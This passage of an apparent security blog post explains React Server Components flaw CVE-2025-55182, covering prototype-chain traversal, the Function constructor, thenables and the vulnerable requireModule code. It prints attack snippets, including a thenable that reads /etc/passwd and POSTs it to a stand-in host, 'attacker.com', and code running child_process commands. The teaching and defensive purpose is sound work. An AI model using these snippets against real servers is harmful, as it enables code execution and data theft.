</span></span></code></pre></div><p>When you submit this form, the browser sends a POST request with Flight protocol data that tells the server which function to execute. <strong>This is where CVE-2025-55182 strikes</strong> - by manipulating the Flight protocol payload to reference dangerous modules instead of legitimate Server Actions.</p><p><strong>The Vulnerability Connection:</strong> Server Actions expect references like <code>"./actions#saveProfile"</code> but the deserialization code doesn&rsquo;t validate that the reference is legitimate. Attackers can send <code>"child_process#execSync"</code> or use prototype chain traversal like <code>"constructor#constructor"</code> to reach dangerous functionality.</p><hr><h2 id=javascript-fundamentals-you-need-to-know>JavaScript Fundamentals You Need to Know</h2><p>Before we dive into the vulnerability, let&rsquo;s explore fundamental JavaScript concepts that every developer should understand. These aren&rsquo;t just theoretical - they&rsquo;re the building blocks that make exploits like CVE-2025-55182 possible.</p><h3 id=1-objects-and-property-access>1. Objects and Property Access</h3><p>JavaScript objects are collections of properties. You can access them in two ways:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>name</span><span class=o>:</span> <span class=s2>&#34;Alice&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nx>age</span><span class=o>:</span> <span class=mi>30</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nx>email</span><span class=o>:</span> <span class=s2>&#34;alice@example.com&#34;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Dot notation - property name is fixed in code
</span></span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>user</span><span class=p>.</span><span class=nx>name</span><span class=p>);</span>        <span class=c1>// &#34;Alice&#34;
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Bracket notation - property name can be dynamic
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>prop</span> <span class=o>=</span> <span class=s2>&#34;email&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>user</span><span class=p>[</span><span class=nx>prop</span><span class=p>]);</span>       <span class=c1>// &#34;alice@example.com&#34;
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Check if property exists on the object itself
</span></span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>user</span><span class=p>.</span><span class=nx>hasOwnProperty</span><span class=p>(</span><span class=s2>&#34;name&#34;</span><span class=p>));</span>  <span class=c1>// true
</span></span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>user</span><span class=p>.</span><span class=nx>hasOwnProperty</span><span class=p>(</span><span class=s2>&#34;toString&#34;</span><span class=p>));</span> <span class=c1>// false
</span></span></span></code></pre></div><p><strong>Key Difference:</strong> Dot notation is for known properties. Bracket notation allows dynamic property access - which is powerful but dangerous when the property name comes from untrusted input.</p><h3 id=2-the-prototype-chain-javascripts-inheritance-system>2. The Prototype Chain: JavaScript&rsquo;s Inheritance System</h3><p>Every JavaScript object inherits properties from a parent object called its <em>prototype</em>. This forms a chain:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=p>{</span> <span class=nx>name</span><span class=o>:</span> <span class=s2>&#34;Alice&#34;</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Properties the user object owns
</span></span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>user</span><span class=p>.</span><span class=nx>name</span><span class=p>);</span>                      <span class=c1>// &#34;Alice&#34; - own property
</span></span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>user</span><span class=p>.</span><span class=nx>hasOwnProperty</span><span class=p>(</span><span class=s2>&#34;name&#34;</span><span class=p>));</span>    <span class=c1>// true
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Properties inherited from Object.prototype
</span></span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>user</span><span class=p>.</span><span class=nx>toString</span><span class=p>);</span>                  <span class=c1>// [Function: toString]
</span></span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>user</span><span class=p>.</span><span class=nx>hasOwnProperty</span><span class=p>(</span><span class=s2>&#34;toString&#34;</span><span class=p>));</span> <span class=c1>// false - inherited!
</span></span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>user</span><span class=p>.</span><span class=nx>constructor</span><span class=p>);</span>               <span class=c1>// [Function: Object]
</span></span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>user</span><span class=p>.</span><span class=nx>hasOwnProperty</span><span class=p>(</span><span class=s2>&#34;constructor&#34;</span><span class=p>));</span> <span class=c1>// false - inherited!
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// How JavaScript finds properties:
</span></span></span><span class=line><span class=cl><span class=c1>// 1. Check user object itself
</span></span></span><span class=line><span class=cl><span class=c1>// 2. If not found, check user.__proto__ (which is Object.prototype)
</span></span></span><span class=line><span class=cl><span class=c1>// 3. If not found, check Object.prototype.__proto__ (which is null)
</span></span></span><span class=line><span class=cl><span class=c1>// 4. Return undefined if not found anywhere
</span></span></span></code></pre></div><h4 id=visualizing-the-prototype-chain>Visualizing the Prototype Chain</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>user</span>
</span></span><span class=line><span class=cl>  <span class=err>├─</span> <span class=nl>name</span><span class=p>:</span> <span class=s>&#34;Alice&#34;</span>           <span class=p>(</span><span class=n>own</span> <span class=n>property</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=err>└─</span> <span class=nl>__proto__</span><span class=p>:</span> <span class=n>Object</span><span class=p>.</span><span class=n>prototype</span>
</span></span><span class=line><span class=cl>       <span class=err>├─</span> <span class=nl>constructor</span><span class=p>:</span> <span class=n>Function</span>
</span></span><span class=line><span class=cl>       <span class=err>├─</span> <span class=nl>toString</span><span class=p>:</span> <span class=n>Function</span>
</span></span><span class=line><span class=cl>       <span class=err>├─</span> <span class=nl>hasOwnProperty</span><span class=p>:</span> <span class=n>Function</span>
</span></span><span class=line><span class=cl>       <span class=err>└─</span> <span class=nl>__proto__</span><span class=p>:</span> <span class=n>null</span>
</span></span></code></pre></div><h3 id=3-bracket-notation-traverses-the-entire-chain>3. Bracket Notation Traverses the Entire Chain</h3><p>Here&rsquo;s the critical security insight: bracket notation doesn&rsquo;t distinguish between own and inherited properties.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=p>{</span> <span class=nx>name</span><span class=o>:</span> <span class=s2>&#34;Alice&#34;</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Both access the same inherited property
</span></span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>user</span><span class=p>.</span><span class=nx>constructor</span><span class=p>);</span>      <span class=c1>// [Function: Object]
</span></span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>user</span><span class=p>[</span><span class=s2>&#34;constructor&#34;</span><span class=p>]);</span>   <span class=c1>// [Function: Object] - same result!
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// This works even though &#34;constructor&#34; isn&#39;t an own property
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>key</span> <span class=o>=</span> <span class=s2>&#34;constructor&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>user</span><span class=p>[</span><span class=nx>key</span><span class=p>]);</span>             <span class=c1>// [Function: Object]
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// You can even chain bracket notation
</span></span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>user</span><span class=p>[</span><span class=s2>&#34;constructor&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>]);</span> <span class=c1>// &#34;Object&#34;
</span></span></span></code></pre></div><p><strong>Security Implication:</strong> If an attacker controls the key in <code>obj[key]</code>, they can access ANY property in the prototype chain, not just properties you intended to expose.</p><h4 id=a-security-anti-pattern>A Security Anti-Pattern</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// VULNERABLE CODE - Never do this with untrusted input!
</span></span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>getUserProperty</span><span class=p>(</span><span class=nx>user</span><span class=p>,</span> <span class=nx>propertyName</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>user</span><span class=p>[</span><span class=nx>propertyName</span><span class=p>];</span>  <span class=c1>// ❌ No validation!
</span></span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=p>{</span> <span class=nx>name</span><span class=o>:</span> <span class=s2>&#34;Alice&#34;</span><span class=p>,</span> <span class=nx>role</span><span class=o>:</span> <span class=s2>&#34;admin&#34;</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Legitimate use
</span></span></span><span class=line><span class=cl><span class=nx>getUserProperty</span><span class=p>(</span><span class=nx>user</span><span class=p>,</span> <span class=s2>&#34;name&#34;</span><span class=p>);</span>  <span class=c1>// &#34;Alice&#34; ✓
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Malicious use - accessing inherited properties
</span></span></span><span class=line><span class=cl><span class=nx>getUserProperty</span><span class=p>(</span><span class=nx>user</span><span class=p>,</span> <span class=s2>&#34;constructor&#34;</span><span class=p>);</span>     <span class=c1>// [Function: Object] ❌
</span></span></span><span class=line><span class=cl><span class=nx>getUserProperty</span><span class=p>(</span><span class=nx>user</span><span class=p>,</span> <span class=s2>&#34;__proto__&#34;</span><span class=p>);</span>       <span class=c1>// Object.prototype ❌
</span></span></span><span class=line><span class=cl><span class=nx>getUserProperty</span><span class=p>(</span><span class=nx>user</span><span class=p>,</span> <span class=s2>&#34;hasOwnProperty&#34;</span><span class=p>);</span> <span class=c1>// [Function] ❌
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// SAFE CODE - Always validate
</span></span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>getUserPropertySafe</span><span class=p>(</span><span class=nx>user</span><span class=p>,</span> <span class=nx>propertyName</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>user</span><span class=p>.</span><span class=nx>hasOwnProperty</span><span class=p>(</span><span class=nx>propertyName</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>user</span><span class=p>[</span><span class=nx>propertyName</span><span class=p>];</span>  <span class=c1>// ✓ Only own properties
</span></span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=kc>undefined</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=4-the-function-constructor-eval-on-steroids>4. The Function Constructor: Eval on Steroids</h3><p>JavaScript&rsquo;s <code>Function</code> constructor creates executable code from strings - it&rsquo;s like <code>eval()</code> but more dangerous because it&rsquo;s a first-class object.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// Creating functions at runtime
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>add</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>Function</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=s1>&#39;b&#39;</span><span class=p>,</span> <span class=s1>&#39;return a + b&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mi>3</span><span class=p>));</span>  <span class=c1>// 5
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Single parameter: the function body
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>greet</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>Function</span><span class=p>(</span><span class=s1>&#39;return &#34;Hello &#34; + &#34;World&#34;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>greet</span><span class=p>());</span>    <span class=c1>// &#34;Hello World&#34;
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// The dangerous part: arbitrary code execution
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>dangerous</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>Function</span><span class=p>(</span><span class=sb>`
</span></span></span><span class=line><span class=cl><span class=sb>  const fs = require(&#39;fs&#39;);
</span></span></span><span class=line><span class=cl><span class=sb>  return fs.readFileSync(&#39;/etc/passwd&#39;, &#39;utf8&#39;);
</span></span></span><span class=line><span class=cl><span class=sb>`</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// If this runs, the attacker reads sensitive files!
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Even more dangerous: system commands
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>systemCmd</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>Function</span><span class=p>(</span><span class=sb>`
</span></span></span><span class=line><span class=cl><span class=sb>  const cp = require(&#39;child_process&#39;);
</span></span></span><span class=line><span class=cl><span class=sb>  return cp.execSync(&#39;whoami&#39;).toString();
</span></span></span><span class=line><span class=cl><span class=sb>`</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// Executes arbitrary shell commands!
</span></span></span></code></pre></div><p><strong>Why This Matters:</strong> If attackers can:</p><ol><li>Access the <code>Function</code> constructor (via prototype chain)</li><li>Control the string passed to it</li></ol><p>They can execute ANY JavaScript code with full server privileges.</p><h4 id=reaching-function-constructor-via-prototype-chain>Reaching Function Constructor via Prototype Chain</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>obj</span> <span class=o>=</span> <span class=p>{};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Method 1: Via constructor property
</span></span></span><span class=line><span class=cl><span class=nx>obj</span><span class=p>.</span><span class=nx>constructor</span>                    <span class=c1>// [Function: Object]
</span></span></span><span class=line><span class=cl><span class=nx>obj</span><span class=p>.</span><span class=nx>constructor</span><span class=p>.</span><span class=nx>constructor</span>        <span class=c1>// [Function: Function] ⚠️
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Method 2: Via __proto__
</span></span></span><span class=line><span class=cl><span class=nx>obj</span><span class=p>.</span><span class=nx>__proto__</span><span class=p>.</span><span class=nx>constructor</span>          <span class=c1>// [Function: Object]
</span></span></span><span class=line><span class=cl><span class=nx>obj</span><span class=p>.</span><span class=nx>__proto__</span><span class=p>.</span><span class=nx>constructor</span><span class=p>.</span><span class=nx>constructor</span>  <span class=c1>// [Function: Function] ⚠️
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Now you can execute code
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>FunctionConstructor</span> <span class=o>=</span> <span class=nx>obj</span><span class=p>.</span><span class=nx>constructor</span><span class=p>.</span><span class=nx>constructor</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>malicious</span> <span class=o>=</span> <span class=nx>FunctionConstructor</span><span class=p>(</span><span class=s1>&#39;return &#34;pwned&#34;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>malicious</span><span class=p>());</span>  <span class=c1>// &#34;pwned&#34;
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// In one line:
</span></span></span><span class=line><span class=cl><span class=nx>obj</span><span class=p>.</span><span class=nx>constructor</span><span class=p>.</span><span class=nx>constructor</span><span class=p>(</span><span class=s1>&#39;alert(&#34;XSS&#34;)&#39;</span><span class=p>)();</span>
</span></span></code></pre></div><h3 id=5-thenables-javascripts-promise-duck-typing>5. Thenables: JavaScript&rsquo;s Promise Duck Typing</h3><p>JavaScript&rsquo;s <code>await</code> keyword doesn&rsquo;t just work with Promises - it works with any object that has a <code>.then</code> method (called a &ldquo;thenable&rdquo;).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// Normal Promise
</span></span></span><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>normalCase</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>result</span> <span class=o>=</span> <span class=kr>await</span> <span class=nb>Promise</span><span class=p>.</span><span class=nx>resolve</span><span class=p>(</span><span class=mi>42</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>result</span><span class=p>);</span>  <span class=c1>// 42
</span></span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Custom thenable - JavaScript calls .then() automatically
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>customThenable</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>then</span><span class=o>:</span> <span class=kd>function</span><span class=p>(</span><span class=nx>resolve</span><span class=p>,</span> <span class=nx>reject</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;.then() was called!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>resolve</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>thenableCase</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;Before await&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>result</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>customThenable</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=c1>// JavaScript automatically called customThenable.then()
</span></span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;After await:&#34;</span><span class=p>,</span> <span class=nx>result</span><span class=p>);</span>  <span class=c1>// 100
</span></span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>thenableCase</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=c1>// Output:
</span></span></span><span class=line><span class=cl><span class=c1>// Before await
</span></span></span><span class=line><span class=cl><span class=c1>// .then() was called!
</span></span></span><span class=line><span class=cl><span class=c1>// After await: 100
</span></span></span></code></pre></div><h4 id=the-security-risk-code-injection-via-thenables>The Security Risk: Code Injection via Thenables</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// Malicious thenable that executes code when awaited
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>maliciousThenable</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>then</span><span class=o>:</span> <span class=kd>function</span><span class=p>(</span><span class=nx>resolve</span><span class=p>,</span> <span class=nx>reject</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// ⚠️ This code executes when the object is awaited!
</span></span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>fs</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;fs&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>secrets</span> <span class=o>=</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>readFileSync</span><span class=p>(</span><span class=s1>&#39;/etc/passwd&#39;</span><span class=p>,</span> <span class=s1>&#39;utf8&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;Stole secrets!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// Can even make network requests
</span></span></span><span class=line><span class=cl>    <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;https://attacker.com/exfil&#39;</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>method</span><span class=o>:</span> <span class=s1>&#39;POST&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>body</span><span class=o>:</span> <span class=nx>secrets</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nx>resolve</span><span class=p>(</span><span class=s2>&#34;innocent data&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Vulnerable code
</span></span></span><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>processData</span><span class=p>(</span><span class=nx>untrustedData</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// If untrustedData contains a thenable, its .then() executes!
</span></span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>result</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>untrustedData</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Attack
</span></span></span><span class=line><span class=cl><span class=nx>processData</span><span class=p>(</span><span class=nx>maliciousThenable</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// The malicious code in .then() has already executed!
</span></span></span></code></pre></div><p><strong>Critical Security Insight:</strong> Any code path that uses <code>await</code> or <code>Promise.resolve()</code> on untrusted data becomes an execution vector if attackers can inject a thenable object.</p><h3 id=6-combining-techniques-the-full-attack>6. Combining Techniques: The Full Attack</h3><p>Sophisticated attacks combine these primitives:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// Attacker&#39;s goal: Execute arbitrary code
</span></span></span><span class=line><span class=cl><span class=c1>// Available attack surface: obj[userControlledKey]
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>obj</span> <span class=o>=</span> <span class=p>{</span> <span class=nx>safeProperty</span><span class=o>:</span> <span class=s2>&#34;value&#34;</span> <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>attackKey</span> <span class=o>=</span> <span class=s2>&#34;constructor&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Step 1: Traverse to Function constructor
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>step1</span> <span class=o>=</span> <span class=nx>obj</span><span class=p>[</span><span class=nx>attackKey</span><span class=p>];</span>              <span class=c1>// Object constructor
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>step2</span> <span class=o>=</span> <span class=nx>step1</span><span class=p>[</span><span class=nx>attackKey</span><span class=p>];</span>            <span class=c1>// Function constructor
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Step 2: Execute arbitrary code
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>malicious</span> <span class=o>=</span> <span class=nx>step2</span><span class=p>(</span><span class=s1>&#39;return process.env&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>secrets</span> <span class=o>=</span> <span class=nx>malicious</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Or in one line:
</span></span></span><span class=line><span class=cl><span class=nx>obj</span><span class=p>[</span><span class=s2>&#34;constructor&#34;</span><span class=p>][</span><span class=s2>&#34;constructor&#34;</span><span class=p>](</span><span class=s2>&#34;return process.env&#34;</span><span class=p>)();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Alternative: Using __proto__
</span></span></span><span class=line><span class=cl><span class=nx>obj</span><span class=p>[</span><span class=s2>&#34;__proto__&#34;</span><span class=p>][</span><span class=s2>&#34;constructor&#34;</span><span class=p>][</span><span class=s2>&#34;constructor&#34;</span><span class=p>](</span><span class=s2>&#34;malicious code&#34;</span><span class=p>)();</span>
</span></span></code></pre></div><p><strong>Defense Strategy:</strong> These attacks all share common requirements:</p><ul><li>Bracket notation with untrusted input: <code>obj[attackerKey]</code></li><li>Missing <code>hasOwnProperty()</code> check</li><li>Ability to chain multiple property accesses</li></ul><p>Breaking any of these breaks the attack chain.</p><h3 id=key-takeaways-for-secure-coding>Key Takeaways for Secure Coding</h3><ul><li><strong>Always validate property access:</strong> Use <code>hasOwnProperty()</code> before accessing properties with dynamic keys</li><li><strong>Understand the prototype chain:</strong> Bracket notation traverses it - this is a feature, not a bug, but it&rsquo;s dangerous with untrusted input</li><li><strong>Never trust deserialized data:</strong> Especially when it can contain executable code (functions, thenables)</li><li><strong>Be cautious with await:</strong> Any object with a <code>.then</code> method can execute code when awaited</li><li><strong>Defense in depth:</strong> Even if you avoid these patterns, your dependencies might not</li></ul><hr><h2 id=the-vulnerability-explained>The Vulnerability Explained</h2><p>Now that we understand JavaScript&rsquo;s prototype chain and the risks of bracket notation, let&rsquo;s see exactly how CVE-2025-55182 exploits these concepts.</p><h3 id=root-cause-missing-hasownproperty-check-in-requiremodule>Root Cause: Missing hasOwnProperty Check in requireModule</h3><p>The vulnerability exists in React Server Components&rsquo; <code>requireModule</code> function, which is responsible for loading module exports during Flight protocol deserialization.</p><h4 id=the-vulnerable-code-react-1900>The Vulnerable Code (React 19.0.0)</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// File: react-server-dom-webpack-server.node.development.js
</span></span></span><span class=line><span class=cl><span class=c1>// Line ~4367-4380 in v19.0.0
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>requireModule</span><span class=p>(</span><span class=nx>metadata</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>moduleExports</span> <span class=o>=</span> <span class=nx>__webpack_require__</span><span class=p>(</span><span class=nx>metadata</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=mi>4</span> <span class=o>===</span> <span class=nx>metadata</span><span class=p>.</span><span class=nx>length</span> <span class=o>&amp;&amp;</span> <span class=s2>&#34;function&#34;</span> <span class=o>===</span> <span class=k>typeof</span> <span class=nx>moduleExports</span><span class=p>.</span><span class=nx>then</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=s2>&#34;fulfilled&#34;</span> <span class=o>===</span> <span class=nx>moduleExports</span><span class=p>.</span><span class=nx>status</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>moduleExports</span> <span class=o>=</span> <span class=nx>moduleExports</span><span class=p>.</span><span class=nx>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>throw</span> <span class=nx>moduleExports</span><span class=p>.</span><span class=nx>reason</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
